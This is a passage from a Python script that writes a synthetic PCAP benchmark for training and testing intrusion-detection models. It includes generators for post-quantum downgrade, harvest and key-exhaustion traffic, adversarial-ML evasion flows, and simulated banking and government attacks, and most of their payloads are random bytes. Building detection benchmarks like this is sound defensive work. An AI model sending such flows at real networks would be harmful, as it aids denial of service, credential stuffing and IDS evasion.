        pkts.append((ts_gen.next(100), _eth_ip_tcp(src, dst, sport, dport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=ch)))
        pkts.append((ts_gen.next(5), _eth_ip_tcp(dst, src, dport, sport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=sh)))
    return pkts


def gen_pq_harvest_now():
    """Harvest-now-decrypt-later: bulk encrypted data capture."""
    src = rand_attacker()
    dst = rand_ip(random.choice(BANKING_NETS + GOV_NETS))
    pkts = []
    # Massive passive capture of encrypted traffic
    for _ in range(random.randint(30, 80)):
        encrypted = b'\x17\x03\x03' + rand_payload(random.randint(500, 1400))
        pkts.append((ts_gen.next(20), _eth_ip_tcp(src, dst, rand_port(), 443, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=encrypted)))
    return pkts


def gen_pq_side_channel():
    """PQ side-channel timing attack: repeated key exchange with precise timing."""
    src, dst = rand_attacker(), rand_ip(random.choice(GOV_NETS))
    sport, dport = rand_port(), 443
    pkts = []
    kyber = random.choice(list(KYBER_PARAMS.keys()))
    kp = KYBER_PARAMS[kyber]
    for _ in range(random.randint(20, 50)):
        # Repeated identical handshakes (timing oracle)
        ch = b'\x16\x03\x03' + rand_payload(kp["pk"] + 200)
        pkts.append((ts_gen.next(50), _eth_ip_tcp(src, dst, sport, dport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=ch)))
        sh = b'\x16\x03\x03' + rand_payload(kp["ct"] + 100)
        pkts.append((ts_gen.next(2), _eth_ip_tcp(dst, src, dport, sport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=sh)))
        # RST to reset
        pkts.append((ts_gen.next(1), _eth_ip_tcp(src, dst, sport, dport, dpkt.tcp.TH_RST)))
    return pkts


def gen_pq_key_exhaustion():
    """Key exhaustion: rapid PQ key generation requests to exhaust server resources."""
    dst = rand_ip(random.choice(BANKING_NETS))
    dport = 443
    pkts = []
    for _ in range(random.randint(40, 100)):
        src = rand_attacker()
        sport = rand_port()
        # SYN + ClientHello with max-size PQ params
        pkts.append((ts_gen.next(2), _eth_ip_tcp(src, dst, sport, dport, dpkt.tcp.TH_SYN)))
        ch = b'\x16\x03\x03' + rand_payload(KYBER_PARAMS["Kyber-1024"]["pk"] + 400)
        pkts.append((ts_gen.next(1), _eth_ip_tcp(src, dst, sport, dport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=ch)))
        # Immediate RST (waste server CPU on key generation)
        pkts.append((ts_gen.next(0.5), _eth_ip_tcp(src, dst, sport, dport, dpkt.tcp.TH_RST)))
    return pkts


# ── Adversarial ML perturbation flows ────────────────────────────────────

def _gen_adversarial_flow(perturbation_type):
    """Generate traffic that mimics adversarial ML evasion attempts.
    The perturbation patterns subtly modify flow characteristics to evade IDS."""
    src, dst = rand_attacker(), rand_target()
    sport, dport = rand_port(), random.choice([80, 443, 22])
    pkts = []

    if perturbation_type == "fgsm":
        # FGSM: small uniform perturbations - slightly altered packet sizes/timing
        for _ in range(random.randint(15, 40)):
            # Attack payload with epsilon-shifted sizes
            size = random.randint(100, 800) + random.choice([-3, -2, -1, 1, 2, 3])
            pkts.append((ts_gen.next(random.uniform(10, 200)), _eth_ip_tcp(src, dst, sport, dport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=rand_payload(max(1, size)))))

    elif perturbation_type == "pgd":
        # PGD: iterative perturbations - gradually shifting flow characteristics
        base_size = random.randint(200, 600)
        for i in range(random.randint(20, 50)):
            size = base_size + int(i * random.uniform(-2, 2))  # Iterative shift
            delay = max(1, 50 + int(i * random.uniform(-1, 1)))
            pkts.append((ts_gen.next(delay), _eth_ip_tcp(src, dst, sport, dport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=rand_payload(max(1, size)))))

    elif perturbation_type == "deepfool":
        # DeepFool: minimal perturbation to cross decision boundary
        # Mix of benign-looking and attack packets
        for _ in range(random.randint(15, 35)):
            if random.random() < 0.6:
                # Benign-mimicking packet
                pkts.append((ts_gen.next(random.uniform(50, 300)), _eth_ip_tcp(src, dst, sport, dport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=rand_payload(random.randint(200, 800)))))
            else:
                # Attack packet disguised as benign
                pkts.append((ts_gen.next(random.uniform(50, 300)), _eth_ip_tcp(src, dst, sport, dport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=rand_payload(random.randint(800, 1400)))))

    elif perturbation_type == "cw":
        # C&W: optimized perturbations minimizing detection confidence
        # Carefully crafted packet sequences mimicking normal traffic patterns
        for _ in range(random.randint(20, 45)):
            # Alternating directions to mimic bidirectional benign flow
            if random.random() < 0.5:
                pkts.append((ts_gen.next(random.uniform(20, 150)), _eth_ip_tcp(src, dst, sport, dport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=rand_payload(random.randint(64, 512)))))
            else:
                pkts.append((ts_gen.next(random.uniform(20, 150)), _eth_ip_tcp(dst, src, dport, sport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=rand_payload(random.randint(64, 512)))))

    elif perturbation_type == "gaussian":
        # Gaussian noise: random perturbations added to flow features
        for _ in range(random.randint(15, 40)):
            size = max(1, int(random.gauss(400, 150)))
            delay = max(1, random.gauss(100, 50))
            pkts.append((ts_gen.next(delay), _eth_ip_tcp(src, dst, sport, dport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=rand_payload(min(size, 1460)))))

    elif perturbation_type == "masking":
        # Feature masking: packets designed to zero out specific flow features
        for _ in range(random.randint(10, 30)):
            # Uniform-size packets (masks size-based features)
            pkts.append((ts_gen.next(100), _eth_ip_tcp(src, dst, sport, dport, dpkt.tcp.TH_ACK, payload=rand_payload(64))))
            pkts.append((ts_gen.next(100), _eth_ip_tcp(dst, src, dport, sport, dpkt.tcp.TH_ACK, payload=rand_payload(64))))

    return pkts


# ── Banking & Government scenario generators ─────────────────────────────

def gen_banking_attack():
    """Simulated attack on banking infrastructure."""
    src = rand_attacker()
    dst = rand_ip(random.choice(BANKING_NETS))
    sport, dport = rand_port(), random.choice(BANKING_PORTS)
    pkts = []
    # Credential stuffing + data exfiltration
    for _ in range(random.randint(10, 25)):
        login = b"POST /api/v2/auth HTTP/1.1\r\nHost: banking.internal\r\nContent-Type: application/json\r\n\r\n{\"card\":\"4111111111111111\",\"pin\":\"" + rand_payload(4) + b"\"}"
        pkts.append((ts_gen.next(200), _eth_ip_tcp(src, dst, sport, dport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=login)))
    # Data exfil
    for _ in range(random.randint(5, 15)):
        exfil = rand_payload(random.randint(500, 1400))
        pkts.append((ts_gen.next(50), _eth_ip_tcp(dst, src, dport, sport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=exfil)))
    return pkts


def gen_gov_attack():
    """Simulated attack on government infrastructure."""
    src = rand_attacker()
    dst = rand_ip(random.choice(GOV_NETS))
    sport, dport = rand_port(), random.choice(GOV_PORTS)
    pkts = []
    # Spear phishing payload delivery
    pkts.append((ts_gen.next(), _eth_ip_tcp(src, dst, sport, dport, dpkt.tcp.TH_SYN)))
    pkts.append((ts_gen.next(3), _eth_ip_tcp(dst, src, dport, sport, dpkt.tcp.TH_SYN | dpkt.tcp.TH_ACK)))
    # Large payload (document with embedded exploit)
    for _ in range(random.randint(10, 20)):
        exploit_data = rand_payload(random.randint(800, 1400))
        pkts.append((ts_gen.next(10), _eth_ip_tcp(src, dst, sport, dport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=exploit_data)))
    # C2 callback
    for _ in range(random.randint(5, 15)):
        beacon = rand_payload(random.randint(16, 128))
        pkts.append((ts_gen.next(3000), _eth_ip_tcp(dst, src, dport, sport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=beacon)))
    return pkts


# ── Master flow distribution ─────────────────────────────────────────────

# Maps class name → generator function
GENERATORS = {
    "Benign": [gen_benign_http, gen_benign_dns, gen_benign_pq_handshake],
    "DDoS-TCP_Flood": [gen_ddos_tcp_flood],
    "DDoS-UDP_Flood": [gen_ddos_udp_flood],
    "DDoS-ICMP_Flood": [gen_ddos_icmp_flood],
    "DDoS-HTTP_Flood": [gen_ddos_http_flood],
    "DDoS-SYN_Flood": [gen_ddos_syn_flood],
    "DDoS-SlowLoris": [gen_ddos_slowloris],
    "DDoS-RSTFIN_Flood": [gen_ddos_rstfin_flood],
    "DDoS-Pshack_Flood": [gen_ddos_pshack_flood],
    "DDoS-ACK_Fragmentation": [gen_ddos_ack_fragmentation],
    "DDoS-UDP_Fragmentation": [gen_ddos_udp_fragmentation],
    "DDoS-ICMP_Fragmentation": [gen_ddos_icmp_fragmentation],
    "Recon-PortScan": [gen_recon_portscan],
    "Recon-OSScan": [gen_recon_osscan],
    "Recon-HostDiscovery": [gen_recon_host_discovery],
    "Recon-PingSweep": [gen_recon_pingsweep],
    "BruteForce-SSH": [gen_bruteforce_ssh],
    "BruteForce-FTP": [gen_bruteforce_ftp],
    "BruteForce-HTTP": [gen_bruteforce_http],
    "BruteForce-Dictionary": [gen_bruteforce_dictionary],
    "Spoofing-ARP": [gen_spoofing_arp],
    "Spoofing-DNS": [gen_spoofing_dns],
    "Spoofing-IP": [gen_spoofing_ip],
    "WebAttack-SQLi": [gen_webattack_sqli],
    "WebAttack-XSS": [gen_webattack_xss],
    "WebAttack-CommandInjection": [gen_webattack_cmdi],
    "WebAttack-BrowserHijacking": [gen_webattack_browser_hijack],
    "Malware-Backdoor": [gen_malware_backdoor],
    "Malware-Ransomware": [gen_malware_ransomware],
    "Mirai-greeth_flood": [gen_mirai_greeth_flood],
    "Mirai-greip_flood": [gen_mirai_greip_flood],
    "Mirai-udpplain": [gen_mirai_udpplain],
    "Mirai-ack": [gen_mirai_ack],
    "DNS_Spoofing": [gen_dns_spoofing],
}

# Additional scenario generators (mapped as extra Benign/attack variants)
SCENARIO_GENERATORS = {
    "PQ-Downgrade": gen_pq_downgrade_attack,
    "PQ-HarvestNow": gen_pq_harvest_now,
    "PQ-SideChannel": gen_pq_side_channel,
    "PQ-KeyExhaustion": gen_pq_key_exhaustion,
    "Banking-Attack": gen_banking_attack,
    "Gov-Attack": gen_gov_attack,
}

ADVERSARIAL_TYPES = ["fgsm", "pgd", "deepfool", "cw", "gaussian", "masking"]


def compute_flow_distribution(total_flows):
    """Compute how many flows for each category.
    Distribution: ~30% benign, ~50% attacks (34 classes), ~20% adversarial/PQ/scenario."""
    dist = {}
    n_benign = int(total_flows * 0.30)
    n_attack = int(total_flows * 0.50)
    n_special = total_flows - n_benign - n_attack

    dist["Benign"] = n_benign

    # Distribute attack flows across 33 attack classes
    attack_classes = [c for c in CLASS_NAMES if c != "Benign"]
    base_per_class = n_attack // len(attack_classes)
    remainder = n_attack - base_per_class * len(attack_classes)
    for i, cls in enumerate(attack_classes):
        dist[cls] = base_per_class + (1 if i < remainder else 0)

    # Special flows: PQ attacks, adversarial ML, banking/gov scenarios
    special_cats = list(SCENARIO_GENERATORS.keys()) + [f"Adversarial-{t}" for t in ADVERSARIAL_TYPES]
    base_special = n_special // len(special_cats)
    remainder_s = n_special - base_special * len(special_cats)
    for i, cat in enumerate(special_cats):
        dist[cat] = base_special + (1 if i < remainder_s else 0)

    return dist


def generate_pcap(output_path, total_flows=3000):
    """Generate the complete adversarial benchmark PCAP."""
    dist = compute_flow_distribution(total_flows)

    print(f"Generating {total_flows} flows → {output_path}")
    print(f"  Benign: {dist.get('Benign', 0)} flows")
    print(f"  Attack classes: {sum(v for k, v in dist.items() if k in CLASS_NAMES and k != 'Benign')} flows across {len(CLASS_NAMES) - 1} classes")
    special_count = sum(v for k, v in dist.items() if k not in CLASS_NAMES)
    print(f"  Special (PQ attacks + adversarial ML + scenarios): {special_count} flows")

    all_packets = []  # List of (timestamp, raw_bytes)
    flow_count = 0

    # Generate standard class flows
    for cls_name in CLASS_NAMES:
        n = dist.get(cls_name, 0)
        gens = GENERATORS.get(cls_name, [gen_benign_http])
        for _ in range(n):
            gen = random.choice(gens)
            try:
                pkts = gen()
                all_packets.extend(pkts)
                flow_count += 1
            except Exception as e:
                print(f"  Warning: {cls_name} generator failed: {e}")

    # Generate PQ-specific attack flows
    for scenario_name, gen_fn in SCENARIO_GENERATORS.items():
        n = dist.get(scenario_name, 0)
        for _ in range(n):
            try:
                pkts = gen_fn()
                all_packets.extend(pkts)
                flow_count += 1
            except Exception as e:
                print(f"  Warning: {scenario_name} generator failed: {e}")

    # Generate adversarial ML flows
    for adv_type in ADVERSARIAL_TYPES:
        key = f"Adversarial-{adv_type}"
        n = dist.get(key, 0)
        for _ in range(n):
            try:
                pkts = _gen_adversarial_flow(adv_type)
                all_packets.extend(pkts)
                flow_count += 1
            except Exception as e:
                print(f"  Warning: Adversarial-{adv_type} generator failed: {e}")

    # Sort by timestamp
    all_packets.sort(key=lambda x: x[0])

    print(f"  Total flows generated: {flow_count}")
    print(f"  Total packets: {len(all_packets)}")

    # Write PCAP
    with open(output_path, 'wb') as f:
        writer = dpkt.pcap.Writer(f, linktype=dpkt.pcap.DLT_EN10MB)
        for ts, pkt_bytes in all_packets:
            writer.writepkt(pkt_bytes, ts=ts)

    size_mb = os.path.getsize(output_path) / (1024 * 1024)
    print(f"  PCAP size: {size_mb:.2f} MB")
    print(f"  Output: {output_path}")
    return output_path


def generate_to_bytes(total_flows=3000):
    """Generate PCAP and return as bytes (for streaming endpoint)."""
    import io
    all_packets = []
    dist = compute_flow_distribution(total_flows)

    for cls_name in CLASS_NAMES:
        n = dist.get(cls_name, 0)
        gens = GENERATORS.get(cls_name, [gen_benign_http])
        for _ in range(n):
            gen = random.choice(gens)
            try:
                all_packets.extend(gen())
            except Exception:
                pass

    for scenario_name, gen_fn in SCENARIO_GENERATORS.items():
        n = dist.get(scenario_name, 0)
        for _ in range(n):
            try:
                all_packets.extend(gen_fn())
            except Exception:
                pass

    for adv_type in ADVERSARIAL_TYPES:
        key = f"Adversarial-{adv_type}"
        n = dist.get(key, 0)
        for _ in range(n):
            try:
                all_packets.extend(_gen_adversarial_flow(adv_type))
            except Exception:
                pass

    all_packets.sort(key=lambda x: x[0])

    buf = io.BytesIO()
    writer = dpkt.pcap.Writer(buf, linktype=dpkt.pcap.DLT_EN10MB)
    for ts, pkt_bytes in all_packets:
        writer.writepkt(pkt_bytes, ts=ts)
    return buf.getvalue()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Generate adversarial benchmark PCAP")
    parser.add_argument("--flows", type=int, default=500, help="Total number of flows (default: 500, ~10MB)")
    parser.add_argument("--output", type=str, default=None, help="Output PCAP path")
    args = parser.parse_args()

    if args.output is None:
        args.output = os.path.join(os.path.dirname(__file__), "adversarial_benchmark.pcap")

    generate_pcap(args.output, args.flows)
